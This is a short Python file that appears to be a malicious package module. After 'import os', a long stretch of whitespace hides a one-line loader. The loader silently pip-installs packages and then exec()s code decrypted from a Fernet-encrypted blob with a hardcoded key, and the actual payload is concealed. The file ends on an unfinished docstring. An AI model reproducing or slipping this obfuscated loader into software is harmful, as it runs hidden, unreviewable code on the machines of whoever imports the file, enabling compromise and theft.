import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'dV_bhs9-KKlojUA_ROR0FZQ2xx5AakgSouHcI_vjPnU=').decrypt(b'gAAAAABnK_ZkKi13tOPdy8AzsWjtvNXzPsDTwPaXOCXNv3CZv0yGGOgmTTAcvosi_ETwh9oXmhrW4vZm66pWeXQk8IWbhD0XlMkmfqBUktydIhyvig9XfiXW_046E91maRgNBHnTr6SOS0T3HCPzSBjiRd3y5FD5OS0JgZe_bmSxlPyBkVcRugu0qEf7NBz6egUcNkuQcawuwzmx7thSVYJ8NXGQfMQ4p8L2ZDbTA39ngaDD1vbK83g='))
'''
Assumptions:
